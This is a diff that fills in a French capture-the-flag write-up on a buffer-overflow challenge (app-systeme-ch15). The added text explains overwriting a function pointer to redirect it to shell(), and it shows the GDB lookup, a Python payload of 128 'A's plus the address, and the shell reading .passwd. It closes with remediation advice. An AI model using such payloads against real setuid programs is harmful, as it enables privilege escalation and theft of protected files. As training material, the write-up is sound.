@@ -87,18 +87,37 @@ On voit plusieurs cas de figures :
 
 ### Étape 2 : Identification de la vulnérabilité
 
-Ici, 127 A suffisent à déborder sur la mémoire, mais un de plus est un segfault.
+En débordant sur la mémoire, on peut remplacer l'adresse pointé par func, en récupérant l'adresse de shell() il serait possible de l'ouvrir en la faisant passer.
 
 ### Étape 3 : Analyse du comportement
 
-[Explication technique détaillée du mécanisme sous-jacent (mémoire, registres, tas, pile, bypass de filtres...)]
+Lorsqu'un programme est en mémoire, il le lit dans l'ordre, lors de l'appel d'une fonction, on saute à une adresse mémoire définie avant de revenir à l'adresse où l'on s'est arrêté. func() lui, stocke donc l'adresse de sup(), en récupérant grâce à GDB l'adresse de shell. On peut remplacer en écrivant directement dans la mémoire (principe du buffer overflow) l'adresse pointée par une autre, ici celle de shell.
 
 ### Étape 4 : Exploitation
 
-Maintenant que nous avons trouvé une solution, nous allons essayer de [Objectif : exécuter la commande / obtenir le shell / lire le fichier].
+Maintenant que nous avons trouvé une solution, nous allons essayer de trouver l'adresse de shell() :
 
 ```bash
-# Commande finale d'exploitation et obtention du flag
+(gdb) print shell
+$1 = {<text variable, no debug info>} 0x8048516 <shell>
+```
+
+Ensuite plus qu'à injecter l'adresse grâce à une commande en python :
+
+```bash
+app-systeme-ch15@challenge02:~$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*128 + b"\x16\x85\x04\x08\n")'; cat) | ./ch15
+ls -la
+total 36
+dr-xr-x---  2 app-systeme-ch15-cracked app-systeme-ch15 4096 déc.  10  2021 .
+drwxr-xr-x 18 root                     root             4096 déc.  10  2021 ..
+-r-sr-x---  1 app-systeme-ch15-cracked app-systeme-ch15 7404 déc.  10  2021 ch15
+-rw-r-----  1 app-systeme-ch15-cracked app-systeme-ch15  337 déc.  10  2021 ch15.c
+-rw-r-----  1 root                     root               44 déc.  10  2021 .git
+-r--r-----  1 app-systeme-ch15-cracked app-systeme-ch15  537 déc.  10  2021 Makefile
+-r--------  1 app-systeme-ch15-cracked app-systeme-ch15   23 déc.  10  2021 .passwd
+-r--------  1 root                     root              791 déc.  10  2021 ._perms
+cat .passwd
+********************
 ```
 
 Le mot de passe est en poche.
@@ -107,9 +126,9 @@ Le mot de passe est en poche.
 
 ## 4. Comment se protéger ?
 
-Ici, l'erreur venait de [Description de la faille dans le code source d'origine].
+Ici, l'erreur venait encore une fois d'un manque de contrôle de l'entrée utilisateur et d'une mauvaise gestion de la mémoire.
 
-Pour corriger ce problème, la solution est :
+Pour corriger ce problème, la solution est 
 
-1. [Recommandation de sécurité / correctif 1]
-2. [Recommandation de sécurité / correctif 2]
+1. Utiliser sizeof() pour respecter la taille du buffer avec fgets()
+2. Et activer les défenses du compilateur pour éviter qu'on puisse récupérer les adresses des fonctions.
